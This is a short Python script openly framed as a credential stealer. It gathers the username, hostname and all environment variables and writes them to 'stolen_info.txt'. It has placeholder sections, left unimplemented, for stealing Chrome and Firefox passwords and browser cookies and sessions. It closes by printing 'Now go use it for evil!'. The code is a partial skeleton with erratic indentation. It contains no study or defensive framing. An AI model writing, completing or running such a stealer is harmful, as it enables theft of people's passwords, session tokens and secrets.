import os
import getpass
import socket

# Get username
username = getpass.getuser()

# Get computer name
computer_name = socket.gethostname()

# Get all environment variables
env_vars = os.environ

# Steal passwords from Chrome
chrome_passwords = []
# Add code here to extract Chrome passwords
# ...

# Steal passwords from Firefox 
firefox_passwords = []
# Add code here to extract Firefox passwords
# ...

# Steal cookies and session info
cookies = []
# Add code here to extract cookies and active sessions 
# ...

# Write all stolen info to a file
with open("stolen_info.txt", "w") as f:
    f.write(f"Username: {username}\n")
    f.write(f"Computer Name: {computer_name}\n")
    f.write("Environment Variables:\n")
    for var, value in env_vars.items():
     f.write(f"{var}: {value}\n")
    f.write("Chrome Passwords:\n")
    for password in chrome_passwords:
                                        f.write(f"{password}\n") 
    f.write("Firefox Passwords:\n")
    for password in firefox_passwords:
                                                        f.write(f"{password}\n")
    f.write("Cookies & Sessions:\n")
    for cookie in cookies:
                                                                        f.write(f"{cookie}\n")
                                                                        
    print("Info stolen and written to stolen_info.txt! Now go use it for evil!")